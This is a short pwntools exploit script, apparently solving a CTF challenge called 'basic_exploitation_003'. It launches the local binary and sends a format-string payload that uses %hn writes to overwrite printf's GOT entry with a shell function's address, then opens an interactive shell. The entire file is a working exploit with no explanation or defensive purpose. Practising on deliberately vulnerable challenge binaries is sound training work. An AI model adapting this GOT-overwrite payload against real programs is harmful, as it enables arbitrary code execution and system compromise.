from pwn import *

port = 0
# rem = remote("", port)
rem = process("./basic_exploitation_003/problem/basic_exploitation_003")

# shell : 0x8048669
# pause()
printf_got = 0x804a010
payload = "%2052c%5$hn%32352c%6$hn".ljust(16).encode() + p32(printf_got + 2) + p32(printf_got)
# payload = b'A' * 16 + p32(printf_got + 2)  + p32(printf_got) * 16+ b'.%1$hp.%2$hp.%3$hp.%4$hp.%5$hp.%6$hp'

rem.sendline(payload)

# print(rem.recvline())
rem.interactive()